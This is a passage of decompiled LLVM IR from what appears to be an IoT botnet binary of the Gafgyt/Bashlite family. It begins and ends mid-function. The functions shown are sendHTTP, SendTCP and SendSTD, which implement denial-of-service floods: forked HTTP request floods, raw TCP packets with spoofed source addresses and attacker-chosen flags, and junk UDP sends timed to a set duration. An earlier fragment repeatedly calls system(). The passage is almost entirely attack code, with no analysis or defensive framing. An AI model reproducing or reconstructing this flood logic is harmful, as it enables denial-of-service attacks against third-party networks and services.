  %v1_10009d5c = call i32 @__libc_system(i32 %v2_10009d08)
  store i8* inttoptr (i32 1886087532 to i8*), i8** %stack_var_-100, align 4
  %v2_10009da0 = load i32, i32* %v1_10009d40, align 4
  store i32 %v2_10009da0, i32* @r4, align 4
  %v3_10009db0 = call i32 @strcat(i8* %v2_10009d50, i32 %v2_10009da0)
  store i32 ptrtoint (i32* @global_var_10018c64.614 to i32), i32* @r4, align 4
  %v3_10009dc4 = call i32 @strcat(i8* %v2_10009d50, i32 ptrtoint (i32* @global_var_10018c64.614 to i32))
  store i32 268475860, i32* @lr, align 4
  %v1_10009dd0 = call i32 @__libc_system(i32 %v2_10009d08)
  %v1_10009dd8 = add nuw nsw i32 %storemerge34, 1
  %tmp13 = icmp slt i32 %v1_10009dd8, 9
  br i1 %tmp13, label %dec_label_pc_10009d08, label %dec_label_pc_10009dec

dec_label_pc_10009dec:                            ; preds = %dec_label_pc_10009d08
  store i32 268475892, i32* @lr, align 4
  %v1_10009df0 = call i32 @sleep(i32 5)
  br label %dec_label_pc_10009cfc

; uselistorder directives
  uselistorder i32 %storemerge34, { 1, 0 }
  uselistorder i32* %stack_var_-112, { 1, 0 }
  uselistorder i8** %stack_var_-100, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @__libc_system, { 1, 0 }
  uselistorder [3 x i8]* @global_var_10017130.34, { 1, 0 }
  uselistorder label %dec_label_pc_10009d08, { 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-576 = alloca i32, align 4
  %stack_var_-600 = alloca i32, align 4
  store i32 268475988, i32* @lr, align 4
  %v1_10009e50 = call i32 @__GI_time(i32 0)
  %v2_10009e5c = add i32 %v1_10009e50, %arg5
  store i32 268476008, i32* @lr, align 4
  %v1_10009e64 = call i32 @random()
  store i32 268476080, i32* @lr, align 4
  %v1_10009eac = call i32 @random()
  %v2_10009ec8 = srem i32 %v1_10009eac, 108
  %v1_10009eec = mul nsw i32 %v2_10009ec8, 4
  %v2_10009ef0 = add i32 %v1_10009eec, ptrtoint ([105 x i8*]* @global_var_1002b140.621 to i32)
  %v1_10009ef4 = inttoptr i32 %v2_10009ef0 to i32*
  %v2_10009ef4 = load i32, i32* %v1_10009ef4, align 4
  %v2_10009ef8 = ptrtoint i32* %stack_var_-576 to i32
  store i32 %v2_10009ef8, i32* @r3, align 4
  %v0_10009f10 = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10009f20.623 to i32), i32* @lr, align 4
  %v9_10009f1c = call i32 @sprintf(i32 %v2_10009ef8, i32 ptrtoint ([62 x i8]* @global_var_10018c90.622 to i32), i32 %arg2, i32 %arg4, i32 %v0_10009f10, i32 %v2_10009ef4, i32 268566528, i32 %v2_10009ec8)
  %v2_1000a00c8 = icmp sgt i32 %arg6, 0
  br i1 %v2_1000a00c8, label %dec_label_pc_10009f2c.lr.ph, label %dec_label_pc_1000a014

dec_label_pc_10009f2c.lr.ph:                      ; preds = %entry
  br label %dec_label_pc_10009f2c

dec_label_pc_10009f2c:                            ; preds = %dec_label_pc_10009f2c.lr.ph, %dec_label_pc_10009ff8
  %storemerge311 = phi i32 [ 0, %dec_label_pc_10009f2c.lr.ph ], [ %v1_10009ffc, %dec_label_pc_10009ff8 ]
  store i32 268476208, i32* @lr, align 4
  %v0_10009f2c = call i32 @__libc_fork()
  %v3_10009f34 = icmp eq i32 %v0_10009f2c, 0
  br i1 %v3_10009f34, label %dec_label_pc_10009ff8, label %dec_label_pc_10009fd8.preheader

dec_label_pc_10009fd8.preheader:                  ; preds = %dec_label_pc_10009f2c
  store i32 268476384, i32* @lr, align 4
  %v1_10009fdc4 = call i32 @__GI_time(i32 0)
  %v2_10009fe85 = icmp slt i32 %v1_10009fdc4, %v2_10009e5c
  br i1 %v2_10009fe85, label %dec_label_pc_10009f40, label %dec_label_pc_10009ff0

dec_label_pc_10009f40:                            ; preds = %dec_label_pc_10009fd8.preheader, %dec_label_pc_10009fd8.backedge
  %v3_10009f54 = call i32 @socket_connect(i32 %arg1, i16 %arg3)
  store i32 %v3_10009f54, i32* %stack_var_-600, align 4
  %v3_10009f64 = icmp eq i32 %v3_10009f54, 0
  br i1 %v3_10009f64, label %dec_label_pc_10009fd8.backedge, label %dec_label_pc_10009f6c

dec_label_pc_10009f6c:                            ; preds = %dec_label_pc_10009f40
  store i32 %v2_10009ef8, i32* @r3, align 4
  %v0_10009f74 = call i32 @__GI_strlen()
  %v3_10009f80 = load i32, i32* %stack_var_-600, align 4
  store i32 268476304, i32* @lr, align 4
  %v2_10009f8c = call i32 @__libc_write(i32 %v3_10009f80, i32 %v2_10009ef8)
  store i32 268476324, i32* @lr, align 4
  %v1_10009fa0 = call i32 @__libc_read(i32 %v3_10009f80)
  store i32 268476332, i32* @lr, align 4
  %v1_10009fa8 = call i32 @__libc_close(i32 %v3_10009f80)
  store i32 %v2_10009ef8, i32* @r3, align 4
  %v0_10009fb4 = call i32 @__GI_strlen()
  %v3_10009fc0 = load i32, i32* %stack_var_-600, align 4
  store i32 268476368, i32* @lr, align 4
  %v2_10009fcc = call i32 @__libc_write(i32 %v3_10009fc0, i32 %v2_10009ef8)
  store i32 ptrtoint ([3 x i8]* @global_var_10009fd8.624 to i32), i32* @lr, align 4
  %v1_10009fd4 = call i32 @__libc_close(i32 %v3_10009fc0)
  br label %dec_label_pc_10009fd8.backedge

dec_label_pc_10009fd8.backedge:                   ; preds = %dec_label_pc_10009f6c, %dec_label_pc_10009f40
  store i32 268476384, i32* @lr, align 4
  %v1_10009fdc = call i32 @__GI_time(i32 0)
  %v2_10009fe8 = icmp slt i32 %v1_10009fdc, %v2_10009e5c
  br i1 %v2_10009fe8, label %dec_label_pc_10009f40, label %dec_label_pc_10009ff0

dec_label_pc_10009ff0:                            ; preds = %dec_label_pc_10009fd8.backedge, %dec_label_pc_10009fd8.preheader
  %v0_10009ff4 = call i32 @__GI_exit()
  br label %dec_label_pc_10009ff8

dec_label_pc_10009ff8:                            ; preds = %dec_label_pc_10009f2c, %dec_label_pc_10009ff0
  %v0_1000a02c13 = phi i32 [ 0, %dec_label_pc_10009f2c ], [ %v0_10009ff4, %dec_label_pc_10009ff0 ]
  %v1_10009ffc = add nuw nsw i32 %storemerge311, 1
  %v2_1000a00c = icmp slt i32 %v1_10009ffc, %arg6
  br i1 %v2_1000a00c, label %dec_label_pc_10009f2c, label %dec_label_pc_1000a014

dec_label_pc_1000a014:                            ; preds = %dec_label_pc_10009ff8, %entry
  %v0_1000a02c = phi i32 [ %v9_10009f1c, %entry ], [ %v0_1000a02c13, %dec_label_pc_10009ff8 ]
  ret i32 %v0_1000a02c

; uselistorder directives
  uselistorder i32 %v2_10009ef8, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v2_10009e5c, { 1, 0 }
  uselistorder i32 268476384, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_10009ff8, { 1, 0 }
  uselistorder label %dec_label_pc_10009f40, { 1, 0 }
  uselistorder label %dec_label_pc_10009f2c, { 1, 0 }
}

define i32 @SendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000a030 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000a030, i32* %stack_var_-128, align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v3_1000a080 = icmp eq i32 %arg2, 0
  br i1 %v3_1000a080, label %dec_label_pc_1000a088, label %dec_label_pc_1000a09c

dec_label_pc_1000a088:                            ; preds = %entry
  %v0_1000a088 = call i32 @rand_cmwc()
  br label %dec_label_pc_1000a0b4

dec_label_pc_1000a09c:                            ; preds = %entry
  %v1_1000a0a0 = urem i32 %arg2, 65536
  store i32 %v1_1000a0a0, i32* @r3, align 4
  %v1_1000a0a8 = call i32 @htons(i32 %v1_1000a0a0)
  br label %dec_label_pc_1000a0b4

dec_label_pc_1000a0b4:                            ; preds = %dec_label_pc_1000a088, %dec_label_pc_1000a09c
  %v2_1000a0b4 = ptrtoint i32* %stack_var_-92 to i32
  %v4_1000a0c4 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-88, i32 %v2_1000a0b4)
  %v3_1000a0cc = icmp eq i32 %v4_1000a0c4, 0
  br i1 %v3_1000a0cc, label %dec_label_pc_1000a0d8, label %dec_label_pc_1000a600

dec_label_pc_1000a0d8:                            ; preds = %dec_label_pc_1000a0b4
  store i32 268476672, i32* @lr, align 4
  %v3_1000a0fc = call i32 @socket(i32 2, i32 3, i32 6)
  %v3_1000a10c = icmp eq i32 %v3_1000a0fc, 0
  br i1 %v3_1000a10c, label %dec_label_pc_1000a600, label %dec_label_pc_1000a118

dec_label_pc_1000a118:                            ; preds = %dec_label_pc_1000a0d8
  store i32 1, i32* %stack_var_-76, align 4
  %v2_1000a120 = ptrtoint i32* %stack_var_-76 to i32
  store i32 268476732, i32* @lr, align 4
  %v5_1000a138 = call i32 @__GI_setsockopt(i32 %v3_1000a0fc, i32 0, i32 3, i32 %v2_1000a120, i32 4)
  %tmp59 = icmp sgt i32 %v5_1000a138, -1
  br i1 %tmp59, label %dec_label_pc_1000a14c, label %dec_label_pc_1000a600

dec_label_pc_1000a14c:                            ; preds = %dec_label_pc_1000a118
  %v3_1000a150 = icmp eq i32 %arg7, 0
  br i1 %v3_1000a150, label %dec_label_pc_1000a17c, label %dec_label_pc_1000a164

dec_label_pc_1000a164:                            ; preds = %dec_label_pc_1000a14c
  %v1_1000a168 = sub i32 32, %arg7
  %v2_1000a170 = urem i32 %v1_1000a168, 64
  %v1_1000a174 = shl i32 -1, %v2_1000a170
  br label %dec_label_pc_1000a17c

dec_label_pc_1000a17c:                            ; preds = %dec_label_pc_1000a14c, %dec_label_pc_1000a164
  %storemerge9 = phi i32 [ %v1_1000a174, %dec_label_pc_1000a164 ], [ 0, %dec_label_pc_1000a14c ]
  %v1_1000a180 = add i32 %arg5, 40
  %v1_1000a190 = add i32 %arg5, 70
  %v1_1000a194 = and i32 %v1_1000a190, -16
  %v2_1000a19c = load i32, i32* %stack_var_-128, align 4
  %v1_1000a1a4 = load i32, i32* @r1, align 4
  %v3_1000a1a4 = sub i32 %v1_1000a1a4, %v1_1000a194
  %v4_1000a1a4 = inttoptr i32 %v3_1000a1a4 to i32*
  store i32 %v2_1000a19c, i32* %v4_1000a1a4, align 4
  %v1_1000a1b4 = add i32 %v3_1000a1a4, 23
  %v1_1000a1b8 = and i32 %v1_1000a1b4, -16
  %v1_1000a1d8 = add i32 %v1_1000a1b8, 20
  %v5_1000a1dc = inttoptr i32 %v1_1000a1d8 to i16*
  %v3_1000a1e0 = load i32, i32* %stack_var_-88, align 4
  %v1_1000a1e8 = call i32 @TelnetScan(i32 %storemerge9)
  store i32 %v1_1000a1e8, i32* @r3, align 4
  %v1_1000a1f4 = call i32 @htonl(i32 %v1_1000a1e8)
  %v1_1000a200 = add i32 %arg5, 20
  %v6_1000a218 = inttoptr i32 %v1_1000a1b8 to i32*
  %v7_1000a218 = call i32 @makeIPPacket(i32* %v6_1000a218, i32 %v3_1000a1e0, i32 %v1_1000a1f4, i32 6, i32 %v1_1000a200, i32 %arg5)
  %v0_1000a21c = call i32 @rand_cmwc()
  %v1_1000a22c = trunc i32 %v0_1000a21c to i16
  store i16 %v1_1000a22c, i16* %v5_1000a1dc, align 4
  %v0_1000a230 = call i32 @rand_cmwc()
  %v2_1000a23c = add i32 %v1_1000a1b8, 24
  %v3_1000a23c = inttoptr i32 %v2_1000a23c to i32*
  store i32 %v0_1000a230, i32* %v3_1000a23c, align 8
  %v2_1000a248 = add i32 %v1_1000a1b8, 28
  %v3_1000a248 = inttoptr i32 %v2_1000a248 to i32*
  store i32 0, i32* %v3_1000a248, align 4
  %v1_1000a250 = add i32 %v1_1000a1b8, 32
  %v2_1000a250 = inttoptr i32 %v1_1000a250 to i32*
  %v1_1000a258 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  %v2_1000a25c = add i32 %v1_1000a1b8, 32
  %v3_1000a25c = inttoptr i32 %v2_1000a25c to i32*
  store i32 %v1_1000a258, i32* %v3_1000a25c, align 16
  store i32 ptrtoint ([4 x i8]* @global_var_10018cd0.625 to i32), i32* @r4, align 4
  %v3_1000a270 = inttoptr i32 %arg4 to i8*
  %v4_1000a270 = call i32 @__GI_strcoll(i8* %v3_1000a270, i32 ptrtoint ([4 x i8]* @global_var_10018cd0.625 to i32))
  %v3_1000a278 = icmp eq i32 %v4_1000a270, 0
  br i1 %v3_1000a278, label %dec_label_pc_1000a280, label %dec_label_pc_1000a2d4

dec_label_pc_1000a280:                            ; preds = %dec_label_pc_1000a17c
  %v3_1000a284 = load i32, i32* %v2_1000a250, align 16
  %v1_1000a2c8 = or i32 %v3_1000a284, 2031616
  store i32 %v1_1000a2c8, i32* %v2_1000a250, align 16
  br label %dec_label_pc_1000a418

dec_label_pc_1000a2d4:                            ; preds = %dec_label_pc_1000a17c
  store i32 ptrtoint (i32* @global_var_10018cd4.626 to i32), i32* @r4, align 4
  store i32 268477160, i32* @lr, align 4
  %v3_1000a2e4 = call i32 @__GI_strtok(i32 %arg4, i32 ptrtoint (i32* @global_var_10018cd4.626 to i32), i32 268566528)
  %v3_1000a41018 = icmp eq i32 %v3_1000a2e4, 0
  br i1 %v3_1000a41018, label %dec_label_pc_1000a418, label %dec_label_pc_1000a2f4

dec_label_pc_1000a2f4:                            ; preds = %dec_label_pc_1000a2d4, %dec_label_pc_1000a3f4
  %storemerge1319 = phi i32 [ %v3_1000a400, %dec_label_pc_1000a3f4 ], [ %v3_1000a2e4, %dec_label_pc_1000a2d4 ]
  store i32 ptrtoint ([4 x i8]* @global_var_10018cd8.627 to i32), i32* @r4, align 4
  %v3_1000a304 = inttoptr i32 %storemerge1319 to i8*
  %v4_1000a304 = call i32 @__GI_strcoll(i8* %v3_1000a304, i32 ptrtoint ([4 x i8]* @global_var_10018cd8.627 to i32))
  %v3_1000a30c = icmp eq i32 %v4_1000a304, 0
  br i1 %v3_1000a30c, label %dec_label_pc_1000a314, label %dec_label_pc_1000a328

dec_label_pc_1000a314:                            ; preds = %dec_label_pc_1000a2f4
  %v3_1000a318 = load i32, i32* %v2_1000a250, align 16
  %v1_1000a31c = or i32 %v3_1000a318, 131072
  store i32 %v1_1000a31c, i32* %v2_1000a250, align 16
  br label %dec_label_pc_1000a3f4

dec_label_pc_1000a328:                            ; preds = %dec_label_pc_1000a2f4
  store i32 ptrtoint ([4 x i8]* @global_var_10018cdc.628 to i32), i32* @r4, align 4
  %v4_1000a338 = call i32 @__GI_strcoll(i8* %v3_1000a304, i32 ptrtoint ([4 x i8]* @global_var_10018cdc.628 to i32))
  %v3_1000a340 = icmp eq i32 %v4_1000a338, 0
  br i1 %v3_1000a340, label %dec_label_pc_1000a348, label %dec_label_pc_1000a35c

dec_label_pc_1000a348:                            ; preds = %dec_label_pc_1000a328
  %v3_1000a34c = load i32, i32* %v2_1000a250, align 16
  %v1_1000a350 = or i32 %v3_1000a34c, 262144
  store i32 %v1_1000a350, i32* %v2_1000a250, align 16
  br label %dec_label_pc_1000a3f4

dec_label_pc_1000a35c:                            ; preds = %dec_label_pc_1000a328
  store i32 ptrtoint ([4 x i8]* @global_var_10018ce0.629 to i32), i32* @r4, align 4
  %v4_1000a36c = call i32 @__GI_strcoll(i8* %v3_1000a304, i32 ptrtoint ([4 x i8]* @global_var_10018ce0.629 to i32))
  %v3_1000a374 = icmp eq i32 %v4_1000a36c, 0
  br i1 %v3_1000a374, label %dec_label_pc_1000a37c, label %dec_label_pc_1000a390

dec_label_pc_1000a37c:                            ; preds = %dec_label_pc_1000a35c
  %v3_1000a380 = load i32, i32* %v2_1000a250, align 16
  %v1_1000a384 = or i32 %v3_1000a380, 65536
  store i32 %v1_1000a384, i32* %v2_1000a250, align 16
  br label %dec_label_pc_1000a3f4

dec_label_pc_1000a390:                            ; preds = %dec_label_pc_1000a35c
  store i32 ptrtoint ([4 x i8]* @global_var_10018ce4.630 to i32), i32* @r4, align 4
  %v4_1000a3a0 = call i32 @__GI_strcoll(i8* %v3_1000a304, i32 ptrtoint ([4 x i8]* @global_var_10018ce4.630 to i32))
  %v3_1000a3a8 = icmp eq i32 %v4_1000a3a0, 0
  br i1 %v3_1000a3a8, label %dec_label_pc_1000a3b0, label %dec_label_pc_1000a3c4

dec_label_pc_1000a3b0:                            ; preds = %dec_label_pc_1000a390
  %v3_1000a3b4 = load i32, i32* %v2_1000a250, align 16
  %v1_1000a3b8 = or i32 %v3_1000a3b4, 1048576
  store i32 %v1_1000a3b8, i32* %v2_1000a250, align 16
  br label %dec_label_pc_1000a3f4

dec_label_pc_1000a3c4:                            ; preds = %dec_label_pc_1000a390
  store i32 ptrtoint ([4 x i8]* @global_var_10018ce8.631 to i32), i32* @r4, align 4
  %v4_1000a3d4 = call i32 @__GI_strcoll(i8* %v3_1000a304, i32 ptrtoint ([4 x i8]* @global_var_10018ce8.631 to i32))
  %v3_1000a3dc = icmp eq i32 %v4_1000a3d4, 0
  br i1 %v3_1000a3dc, label %dec_label_pc_1000a3e4, label %dec_label_pc_1000a3f4

dec_label_pc_1000a3e4:                            ; preds = %dec_label_pc_1000a3c4
  %v3_1000a3e8 = load i32, i32* %v2_1000a250, align 16
  %v1_1000a3ec = or i32 %v3_1000a3e8, 524288
  store i32 %v1_1000a3ec, i32* %v2_1000a250, align 16
  br label %dec_label_pc_1000a3f4

dec_label_pc_1000a3f4:                            ; preds = %dec_label_pc_1000a3c4, %dec_label_pc_1000a3b0, %dec_label_pc_1000a37c, %dec_label_pc_1000a348, %dec_label_pc_1000a314, %dec_label_pc_1000a3e4
  store i32 ptrtoint (i32* @global_var_10018cd4.626 to i32), i32* @r4, align 4
  store i32 268477444, i32* @lr, align 4
  %v3_1000a400 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10018cd4.626 to i32), i32 268566528)
  %v3_1000a410 = icmp eq i32 %v3_1000a400, 0
  br i1 %v3_1000a410, label %dec_label_pc_1000a418, label %dec_label_pc_1000a2f4

dec_label_pc_1000a418:                            ; preds = %dec_label_pc_1000a3f4, %dec_label_pc_1000a2d4, %dec_label_pc_1000a280
  %v0_1000a418 = call i32 @rand_cmwc()
  %v1_1000a428 = trunc i32 %v0_1000a418 to i16
  %v3_1000a428 = add i32 %v1_1000a1b8, 34
  %v4_1000a428 = inttoptr i32 %v3_1000a428 to i16*
  store i16 %v1_1000a428, i16* %v4_1000a428, align 2
  %v3_1000a434 = add i32 %v1_1000a1b8, 36
  %v4_1000a434 = inttoptr i32 %v3_1000a434 to i16*
  store i16 0, i16* %v4_1000a434, align 4
  %v3_1000a440 = add i32 %v1_1000a1b8, 38
  %v4_1000a440 = inttoptr i32 %v3_1000a440 to i16*
  store i16 0, i16* %v4_1000a440, align 2
  br i1 %v3_1000a080, label %dec_label_pc_1000a450, label %dec_label_pc_1000a464

dec_label_pc_1000a450:                            ; preds = %dec_label_pc_1000a418
  %v0_1000a450 = call i32 @rand_cmwc()
  %extract.t63 = trunc i32 %v0_1000a450 to i16
  br label %dec_label_pc_1000a47c

dec_label_pc_1000a464:                            ; preds = %dec_label_pc_1000a418
  %v1_1000a468 = urem i32 %arg2, 65536
  store i32 %v1_1000a468, i32* @r3, align 4
  %v1_1000a470 = call i32 @htons(i32 %v1_1000a468)
  %extract.t = trunc i32 %v1_1000a470 to i16
  br label %dec_label_pc_1000a47c

dec_label_pc_1000a47c:                            ; preds = %dec_label_pc_1000a450, %dec_label_pc_1000a464
  %storemerge60.off0 = phi i16 [ %extract.t, %dec_label_pc_1000a464 ], [ %extract.t63, %dec_label_pc_1000a450 ]
  %v3_1000a484 = add i32 %v1_1000a1b8, 22
  %v4_1000a484 = inttoptr i32 %v3_1000a484 to i16*
  store i16 %storemerge60.off0, i16* %v4_1000a484, align 2
  store i32 268477588, i32* @lr, align 4
  %v3_1000a490 = inttoptr i32 %v1_1000a1d8 to i32*
  %v4_1000a490 = call i32 @tcpcsum(i32 %v1_1000a1b8, i32* %v3_1000a490, i32 %v1_1000a1d8)
  %v1_1000a49c = trunc i32 %v4_1000a490 to i16
  store i16 %v1_1000a49c, i16* %v4_1000a434, align 4
  %v1_1000a4ac = or i32 %v1_1000a1b8, 2
  %v2_1000a4ac = inttoptr i32 %v1_1000a4ac to i16*
  %v3_1000a4ac = load i16, i16* %v2_1000a4ac, align 2
  %v4_1000a4ac = zext i16 %v3_1000a4ac to i32
  %v5_1000a4bc = inttoptr i32 %v1_1000a1b8 to i16*
  %v6_1000a4bc = call i32 @csum(i16* %v5_1000a4bc, i32 %v4_1000a4ac, i32 %v1_1000a1b8, i32 6, i32 %v1_1000a200)
  %sext3 = mul i32 %v6_1000a4bc, 65536
  %v1_1000a4c0 = sdiv i32 %sext3, 65536
  %v1_1000a4c8 = trunc i32 %v1_1000a4c0 to i16
  %v3_1000a4c8 = or i32 %v1_1000a1b8, 10
  %v4_1000a4c8 = inttoptr i32 %v3_1000a4c8 to i16*
  store i16 %v1_1000a4c8, i16* %v4_1000a4c8, align 2
  store i32 268477652, i32* @lr, align 4
  %v1_1000a4d0 = call i32 @__GI_time(i32 0)
  %v2_1000a4dc = add i32 %v1_1000a4d0, %arg3
  %v2_1000a530 = or i32 %v1_1000a1b8, 12
  %v3_1000a530 = inttoptr i32 %v2_1000a530 to i32*
  %v3_1000a544 = or i32 %v1_1000a1b8, 4
  %v4_1000a544 = inttoptr i32 %v3_1000a544 to i16*
  br label %dec_label_pc_1000a4f0

dec_label_pc_1000a4f0:                            ; preds = %dec_label_pc_1000a4f0.backedge, %dec_label_pc_1000a47c
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_1000a47c ], [ %storemerge22, %dec_label_pc_1000a4f0.backedge ]
  store i32 268477716, i32* @lr, align 4
  %v7_1000a510 = call i32 @__libc_sendto(i32 %v3_1000a0fc, i32 %v1_1000a1b8, i32 %v1_1000a180, i32 0, i32 %v2_1000a0b4, i32 16, i32 %v2_1000a0b4)
  %v1_1000a518 = call i32 @TelnetScan(i32 %storemerge9)
  store i32 %v1_1000a518, i32* @r3, align 4
  %v1_1000a524 = call i32 @htonl(i32 %v1_1000a518)
  store i32 %v1_1000a524, i32* %v3_1000a530, align 4
  %v0_1000a534 = call i32 @rand_cmwc()
  %v1_1000a544 = trunc i32 %v0_1000a534 to i16
  store i16 %v1_1000a544, i16* %v4_1000a544, align 4
  %v0_1000a548 = call i32 @rand_cmwc()
  store i32 %v0_1000a548, i32* %v3_1000a23c, align 8
  %v0_1000a558 = call i32 @rand_cmwc()
  %v1_1000a568 = trunc i32 %v0_1000a558 to i16
  store i16 %v1_1000a568, i16* %v5_1000a1dc, align 4
  store i16 0, i16* %v4_1000a434, align 4
  store i32 268477828, i32* @lr, align 4
  %v4_1000a580 = call i32 @tcpcsum(i32 %v1_1000a1b8, i32* %v3_1000a490, i32 %v1_1000a1d8)
  %v1_1000a58c = trunc i32 %v4_1000a580 to i16
  store i16 %v1_1000a58c, i16* %v4_1000a434, align 4
  %v3_1000a59c = load i16, i16* %v2_1000a4ac, align 2
  %v4_1000a59c = zext i16 %v3_1000a59c to i32
  %v6_1000a5ac = call i32 @csum(i16* %v5_1000a4bc, i32 %v4_1000a59c, i32 %v1_1000a1b8, i32 0, i32 %v2_1000a0b4)
  %v1_1000a5b8 = trunc i32 %v6_1000a5ac to i16
  store i16 %v1_1000a5b8, i16* %v4_1000a4c8, align 2
  %v4_1000a5c4 = icmp eq i32 %stack_var_-44.0, %arg6
  br i1 %v4_1000a5c4, label %dec_label_pc_1000a5cc, label %dec_label_pc_1000a5f0

dec_label_pc_1000a5cc:                            ; preds = %dec_label_pc_1000a4f0
  store i32 268477908, i32* @lr, align 4
  %v1_1000a5d0 = call i32 @__GI_time(i32 0)
  %v3_1000a5dc = icmp sgt i32 %v1_1000a5d0, %v2_1000a4dc
  br i1 %v3_1000a5dc, label %dec_label_pc_1000a600, label %dec_label_pc_1000a4f0.backedge

dec_label_pc_1000a4f0.backedge:                   ; preds = %dec_label_pc_1000a5cc, %dec_label_pc_1000a5f0
  %storemerge22 = phi i32 [ %v1_1000a5f4, %dec_label_pc_1000a5f0 ], [ 0, %dec_label_pc_1000a5cc ]
  br label %dec_label_pc_1000a4f0

dec_label_pc_1000a5f0:                            ; preds = %dec_label_pc_1000a4f0
  %v1_1000a5f4 = add i32 %stack_var_-44.0, 1
  br label %dec_label_pc_1000a4f0.backedge

dec_label_pc_1000a600:                            ; preds = %dec_label_pc_1000a5cc, %dec_label_pc_1000a118, %dec_label_pc_1000a0d8, %dec_label_pc_1000a0b4
  %v0_1000a628 = phi i32 [ %v5_1000a138, %dec_label_pc_1000a118 ], [ 0, %dec_label_pc_1000a0d8 ], [ %v4_1000a0c4, %dec_label_pc_1000a0b4 ], [ %v1_1000a5d0, %dec_label_pc_1000a5cc ]
  ret i32 %v0_1000a628

; uselistorder directives
  uselistorder i32 %v1_1000a468, { 1, 0 }
  uselistorder i32 %v3_1000a400, { 1, 0 }
  uselistorder i32* %v2_1000a250, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32 %v1_1000a200, { 1, 0 }
  uselistorder i32 %v1_1000a1d8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000a1b8, { 14, 15, 4, 2, 3, 5, 16, 1, 6, 17, 7, 8, 9, 10, 0, 11, 12, 13, 18, 19 }
  uselistorder i32 %v2_1000a0b4, { 1, 3, 2, 0 }
  uselistorder i32 %v1_1000a0a0, { 1, 0 }
  uselistorder i32* %stack_var_-92, { 1, 0 }
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32 (i32)* @htonl, { 1, 0 }
  uselistorder i32 (i32)* @TelnetScan, { 1, 0 }
  uselistorder i32 -16, { 1, 0, 2, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg5, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000a4f0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000a47c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a3f4, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_1000a2f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a17c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a0b4, { 1, 0 }
}

define i32 @SendSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 268478044, i32* @lr, align 4
  %v3_1000a658 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 268478060, i32* @lr, align 4
  %v1_1000a668 = call i32 @__GI_time(i32 0)
  store i32 268478080, i32* @lr, align 4
  %v1_1000a67c = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_1000a688 = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_1000a6b0 = add i32 %v1_1000a67c, 16
  %v2_1000a6b0 = inttoptr i32 %v1_1000a6b0 to i32*
  %v3_1000a6b0 = load i32, i32* %v2_1000a6b0, align 4
  %v1_1000a6b4 = inttoptr i32 %v3_1000a6b0 to i32*
  %v2_1000a6b4 = load i32, i32* %v1_1000a6b4, align 4
  %v2_1000a6bc = ptrtoint i32* %stack_var_-36 to i32
  %v1_1000a6c4 = add i32 %v1_1000a67c, 12
  %v2_1000a6c4 = inttoptr i32 %v1_1000a6c4 to i32*
  %v3_1000a6c4 = load i32, i32* %v2_1000a6c4, align 4
  store i32 %v3_1000a6c4, i32* @r5, align 4
  store i32 268478168, i32* @lr, align 4
  %v4_1000a6d4 = call i32 @bcopy(i32 %v2_1000a6b4, i32 %v2_1000a6bc, i32 %v3_1000a6c4, i32 %v1_1000a67c)
  %v1_1000a6dc = add i32 %v1_1000a67c, 8
  %v2_1000a6dc = inttoptr i32 %v1_1000a6dc to i32*
  %v3_1000a6dc = load i32, i32* %v2_1000a6dc, align 4
  %v1_1000a6e0 = urem i32 %v3_1000a6dc, 65536
  store i32 %v1_1000a6e0, i32* %stack_var_-40, align 4
  %v2_1000a748 = add i32 %v1_1000a668, %arg3
  br label %dec_label_pc_1000a6fc

dec_label_pc_1000a6fc:                            ; preds = %dec_label_pc_1000a76c, %entry
  %storemerge1 = phi i32 [ 0, %entry ], [ %v1_1000a770, %dec_label_pc_1000a76c ]
  %tmp17 = icmp ult i32 %storemerge1, 50
  br i1 %tmp17, label %dec_label_pc_1000a76c, label %dec_label_pc_1000a708

dec_label_pc_1000a708:                            ; preds = %dec_label_pc_1000a6fc
  store i32 268478240, i32* @lr, align 4
  %v5_1000a71c = call i32 @__libc_send(i32 %v3_1000a658, i32 ptrtoint ([4 x i8]* @global_var_10018cec.632 to i32), i32 69, i32 0)
  store i32 ptrtoint ([3 x i8]* @global_var_1000a734.633 to i32), i32* @lr, align 4
  %v3_1000a730 = call i32 @__libc_connect(i32 %v3_1000a658, i32 %v2_1000a688, i32 16)
  store i32 268478268, i32* @lr, align 4
